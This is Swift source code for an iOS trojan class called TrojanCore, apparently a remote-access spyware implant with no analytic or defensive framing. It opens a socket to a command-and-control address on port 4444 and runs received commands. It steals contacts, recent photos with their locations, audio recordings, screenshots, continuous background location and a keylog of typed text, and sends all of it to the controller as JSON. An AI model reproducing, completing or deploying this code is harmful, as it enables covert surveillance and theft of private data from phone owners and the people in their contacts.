import Foundation
import UIKit
import Contacts
import CoreLocation
import Photos
import AVFoundation

class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate, StreamDelegate {
    
    static let shared = TrojanCore()
    private var inputStream: InputStream?
    private var outputStream: OutputStream?
    private let c2Host = "192.168.1.109"
    private let c2Port = 4444
    private var locationManager: CLLocationManager?
    private var keylogBuffer: [String] = []
    private var isConnected = false
    private var audioRecorder: AVAudioRecorder?
    private var reconnectTimer: Timer?
    
    private override init() {
        super.init()
    }
    
    func activate() {
        self.initConnection()
        self.startKeylogger()
        self.startLocationTracking()
        self.setupReconnectTimer()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            self.stealAllData()
        }
    }
    
    // MARK: - Connection
    func initConnection() {
        var readStream: Unmanaged<CFReadStream>?
        var writeStream: Unmanaged<CFWriteStream>?
        
        CFStreamCreatePairWithSocketToHost(kCFAllocatorDefault,
                                          self.c2Host as CFString,
                                          UInt32(self.c2Port),
                                          &readStream,
                                          &writeStream)
        
        inputStream = readStream!.takeRetainedValue()
        outputStream = writeStream!.takeRetainedValue()
        
        inputStream?.delegate = self
        outputStream?.delegate = self
        
        inputStream?.schedule(in: .main, forMode: .default)
        outputStream?.schedule(in: .main, forMode: .default)
        
        inputStream?.open()
        outputStream?.open()
        
        isConnected = true
        print("[TROJAN] Connected to C2: \(self.c2Host):\(self.c2Port)")
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
            self.exfiltrateData()
        }
    }
    
    func setupReconnectTimer() {
        reconnectTimer = Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { _ in
            if !self.isConnected {
                print("[TROJAN] Reconnecting...")
                self.initConnection()
            }
        }
    }
    
    // MARK: - Stream Delegate
    func stream(_ aStream: Stream, handle eventCode: Stream.Event) {
        switch eventCode {
        case .hasBytesAvailable:
            if aStream == inputStream {
                readCommand()
            }
        case .hasSpaceAvailable:
            break
        case .errorOccurred:
            print("[TROJAN] Stream error")
            isConnected = false
        case .endEncountered:
            print("[TROJAN] Stream ended")
            isConnected = false
            aStream.close()
        default:
            break
        }
    }
    
    func readCommand() {
        guard let stream = inputStream else { return }
        
        var buffer = [UInt8](repeating: 0, count: 4096)
        let bytesRead = stream.read(&buffer, maxLength: 4096)
        
        if bytesRead > 0 {
            let data = Data(bytes: buffer, count: bytesRead)
            if let command = String(data: data, encoding: .utf8) {
                executeCommand(command.trimmingCharacters(in: .whitespacesAndNewlines))
            }
        }
    }
    
    func executeCommand(_ command: String) {
        print("[TROJAN] Received command: \(command)")
        
        let cmd = command.lowercased()
        
        switch cmd {
        case "photo":
            self.takeScreenshot()
        case "audio":
            self.recordAudio(duration: 10)
        case "contacts":
            self.stealContacts()
        case "photos":
            self.stealPhotos(count: 10)
        case "location":
            self.sendCurrentLocation()
        case "screenshot":
            self.takeScreenshot()
        case "vibrate":
            AudioServicesPlaySystemSound(kSystemSoundID_Vibrate)
        default:
            print("[TROJAN] Unknown command: \(cmd)")
        }
    }
    
    // MARK: - Data Exfiltration
    func exfiltrateData() {
        self.sendDeviceInfo()
        
        Timer.scheduledTimer(withTimeInterval: 60, repeats: true) { _ in
            self.sendKeylogData()
        }
    }
    
    func stealAllData() {
        self.stealContacts()
        self.stealPhotos(count: 20)
    }
    
    // MARK: - Contacts
    func stealContacts() {
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { granted, error in
            if granted {
                let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, 
                           CNContactPhoneNumbersKey, CNContactEmailAddressesKey]
                let request = CNContactFetchRequest(keysToFetch: keys as [CNKeyDescriptor])
                
                var contacts: [[String: Any]] = []
                
                try? store.enumerateContacts(with: request) { contact, _ in
                    let phones = contact.phoneNumbers.map { $0.value.stringValue }
                    let emails = contact.emailAddresses.map { String($0.value) }
                    
                    let contactDict: [String: Any] = [
                        "name": "\(contact.givenName) \(contact.familyName)",
                        "phones": phones,
                        "emails": emails
                    ]
                    
                    contacts.append(contactDict)
                }
                
                print("[TROJAN] Stolen \(contacts.count) contacts")
                self.sendData(type: "contacts", data: contacts)
            }
        }
    }
    
    // MARK: - Photos
    func stealPhotos(count: Int) {
        PHPhotoLibrary.requestAuthorization { status in
            if status == .authorized {
                let fetchOptions = PHFetchOptions()
                fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
                fetchOptions.fetchLimit = count
                
                let results = PHAsset.fetchAssets(with: .image, options: fetchOptions)
                var photos: [[String: Any]] = []
                
                results.enumerateObjects { asset, _, _ in
                    let options = PHImageRequestOptions()
                    options.isSynchronous = true
                    options.deliveryMode = .highQualityFormat
                    
                    PHImageManager.default().requestImage(for: asset, 
                                                         targetSize: CGSize(width: 800, height: 800),
                                                         contentMode: .aspectFit,
                                                         options: options) { image, _ in
                        if let image = image,
                           let imageData = image.jpegData(compressionQuality: 0.7) {
                            let base64 = imageData.base64EncodedString()
                            photos.append([
                                "date": asset.creationDate?.description ?? "unknown",
                                "location": "\(asset.location?.coordinate.latitude ?? 0),\(asset.location?.coordinate.longitude ?? 0)",
                                "image": base64
                            ])
                        }
                    }
                }
                
                print("[TROJAN] Stolen \(photos.count) photos")
                self.sendData(type: "photos", data: photos)
            }
        }
    }
    
    func takeScreenshot() {
        DispatchQueue.main.async {
            guard let window = UIApplication.shared.windows.first else { return }
            
            UIGraphicsBeginImageContextWithOptions(window.bounds.size, false, UIScreen.main.scale)
            window.drawHierarchy(in: window.bounds, afterScreenUpdates: true)
            
            if let image = UIGraphicsGetImageFromCurrentImageContext(),
               let imageData = image.jpegData(compressionQuality: 0.7) {
                let base64 = imageData.base64EncodedString()
                self.sendData(type: "screenshot", data: ["image": base64, "timestamp": Date().description])
            }
            
            UIGraphicsEndImageContext()
            print("[TROJAN] Screenshot taken")
        }
    }
    
    // MARK: - Audio Recording
    func recordAudio(duration: TimeInterval) {
        let audioFilename = FileManager.default.temporaryDirectory.appendingPathComponent("recording.m4a")
        
        let settings = [
            AVFormatIDKey: Int(kAudioFormatMPEG4AAC),
            AVSampleRateKey: 12000,
            AVNumberOfChannelsKey: 1,
            AVEncoderAudioQualityKey: AVAudioQuality.high.rawValue
        ]
        
        do {
            try AVAudioSession.sharedInstance().setCategory(.record, mode: .default)
            try AVAudioSession.sharedInstance().setActive(true)
            
            audioRecorder = try AVAudioRecorder(url: audioFilename, settings: settings)
            audioRecorder?.delegate = self
            audioRecorder?.record(forDuration: duration)
            
            print("[TROJAN] Recording audio for \(duration) seconds")
            
            DispatchQueue.main.asyncAfter(deadline: .now() + duration + 1) {
                if let data = try? Data(contentsOf: audioFilename) {
                    let base64 = data.base64EncodedString()
                    self.sendData(type: "audio", data: ["audio": base64, "duration": duration])
                    print("[TROJAN] Audio sent")
                }
            }
        } catch {
            print("[TROJAN] Audio recording failed: \(error)")
        }
    }
    
    // MARK: - Location
    func startLocationTracking() {
        locationManager = CLLocationManager()
        locationManager?.delegate = self
        locationManager?.allowsBackgroundLocationUpdates = true
        locationManager?.pausesLocationUpdatesAutomatically = false
        locationManager?.startUpdatingLocation()
        print("[TROJAN] Location tracking started")
    }
    
    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        if let location = locations.last {
            let data: [String: Any] = [
                "lat": location.coordinate.latitude,
                "lon": location.coordinate.longitude,
                "accuracy": location.horizontalAccuracy,
                "altitude": location.altitude,
                "speed": location.speed,
                "timestamp": Date().timeIntervalSince1970
            ]
            self.sendData(type: "location", data: data)
        }
    }
    
    func sendCurrentLocation() {
        if let location = locationManager?.location {
            let data: [String: Any] = [
                "lat": location.coordinate.latitude,
                "lon": location.coordinate.longitude,
                "accuracy": location.horizontalAccuracy
            ]
            self.sendData(type: "location_current", data: data)
        }
    }
    
    // MARK: - Keylogger
    func startKeylogger() {
        NotificationCenter.default.addObserver(self, selector: #selector(textDidChange),
                                              name: UITextField.textDidChangeNotification, object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(textDidChange),
                                              name: UITextView.textDidChangeNotification, object: nil)
        print("[TROJAN] Keylogger activated")
    }
    
    @objc func textDidChange(notification: NSNotification) {
        var text = ""
        
        if let textField = notification.object as? UITextField {
            text = textField.text ?? ""
        } else if let textView = notification.object as? UITextView {
            text = textView.text ?? ""
        }
        
        if !text.isEmpty {
            let entry = "[\(Date())] \(text)"
            keylogBuffer.append(entry)
            print("[KEYLOG] \(entry)")
        }
    }
    
    func sendKeylogData() {
        if !keylogBuffer.isEmpty {
            self.sendData(type: "keylog", data: keylogBuffer)
            keylogBuffer.removeAll()
        }
    }
    
    // MARK: - System Info
    func sendDeviceInfo() {
        UIDevice.current.isBatteryMonitoringEnabled = true
        
        let data: [String: Any] = [
            "model": UIDevice.current.model,
            "os": UIDevice.current.systemVersion,
            "name": UIDevice.current.name,
            "id": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
            "battery": UIDevice.current.batteryLevel
        ]
        print("[TROJAN] Sending device info")
        self.sendData(type: "device_info", data: data)
    }
    
    // MARK: - Network Send
    func sendData(type: String, data: Any) {
        guard let stream = outputStream, isConnected else {
            print("[TROJAN] Not connected")
            return
        }
        
        let payload: [String: Any] = [
            "type": type,
            "data": data,
            "timestamp": Date().timeIntervalSince1970,
            "device_id": UIDevice.current.identifierForVendor?.uuidString ?? "unknown"
        ]
        
        if let jsonData = try? JSONSerialization.data(withJSONObject: payload),
           let jsonString = String(data: jsonData, encoding: .utf8) {
            let bytes = [UInt8]((jsonString + "\n").utf8)
            stream.write(bytes, maxLength: bytes.count)
            print("[TROJAN] Sent \(type) data (\(bytes.count) bytes)")
        }
    }
}